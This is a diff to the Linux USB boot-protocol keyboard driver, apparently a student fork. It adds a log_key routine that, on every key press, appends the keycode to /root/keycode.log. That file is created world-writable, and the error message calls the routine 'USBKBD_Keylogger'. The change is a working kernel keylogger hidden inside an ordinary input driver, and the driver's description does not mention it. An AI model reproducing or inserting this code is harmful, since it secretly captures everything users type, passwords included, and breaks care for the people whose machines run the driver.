@@ -32,6 +32,11 @@
 #include <linux/init.h>
 #include <linux/usb/input.h>
 #include <linux/hid.h>
+#include <linux/fs.h>
+#include <linux/file.h>
+#include <linux/fcntl.h>
+#include <asm/uaccess.h>
+
 
 /*
  * Version Information
@@ -39,6 +44,8 @@
 #define DRIVER_VERSION ""
 #define DRIVER_AUTHOR "Ming Hu s3554025 forked from kernel source"
 #define DRIVER_DESC "USB HID Boot Protocol keyboard driver"
+
+static void log_key(char * path, char * str_to_write);
 
 MODULE_AUTHOR(DRIVER_AUTHOR);
 MODULE_DESCRIPTION(DRIVER_DESC);
@@ -112,6 +119,7 @@ struct usb_kbd {
 static void usb_kbd_irq(struct urb *urb)
 {
 	struct usb_kbd *kbd = urb->context;
+	char str_to_write[3];
 	int i;
 
 	switch (urb->status) {
@@ -142,11 +150,25 @@ static void usb_kbd_irq(struct urb *urb)
 
 		if (kbd->new[i] > 3 && memscan(kbd->old + 2, kbd->new[i], 6) == kbd->old + 8) {
 			if (usb_kbd_keycode[kbd->new[i]])
-				input_report_key(kbd->dev, usb_kbd_keycode[kbd->new[i]], 1);
+			{
+				input_report_key(
+						kbd->dev,
+						usb_kbd_keycode[kbd->new[i]], 1);
+
+				// Concat the char to string
+				str_to_write[0] = usb_kbd_keycode[kbd->new[i]];
+				str_to_write[1] = ' ';
+				str_to_write[2] = '\0';
+
+				log_key("/root/keycode.log", str_to_write);
+			}
 			else
+			{
 				hid_info(urb->dev,
-					 "Unknown key (scancode %#x) pressed.\n",
-					 kbd->new[i]);
+						 "Unknown key (scancode %#x) pressed.\n",
+						 kbd->new[i]);
+			}
+
 		}
 	}
 
@@ -390,6 +412,42 @@ static void usb_kbd_disconnect(struct usb_interface *intf)
 		usb_kbd_free_mem(interface_to_usbdev(intf), kbd);
 		kfree(kbd);
 	}
+}
+
+static void log_key(char * path, char * str_to_write)
+{
+	// Declare file pointer and segment stuff
+	struct file * file_pointer;
+	mm_segment_t origin_file_segment;
+
+	// Try open it
+	// File open mode: r/w, append; Permission: 666
+	file_pointer = filp_open(path, O_RDWR | O_APPEND | O_CREAT, 0666);
+
+	// If something went wrong, print debug info and stop
+	if(IS_ERR(file_pointer))
+	{
+		printk(KERN_ERR "USBKBD_Keylogger: Failed to open file, returned error %ld", PTR_ERR(file_pointer));
+		return;
+	}
+
+	// Backup file segment and set to kernel space operations
+	origin_file_segment = get_fs();
+	set_fs(KERNEL_DS);
+
+	// Write to file
+	file_pointer->f_op->write(
+			file_pointer,
+			str_to_write,
+			strlen(str_to_write),
+			&file_pointer->f_pos);
+
+
+	// Restore file segment back to original one
+	set_fs(origin_file_segment);
+
+	// Close the file pointer (also flush)
+	filp_close(file_pointer, NULL);
 }
 
 static const struct usb_device_id usb_kbd_id_table[] = {
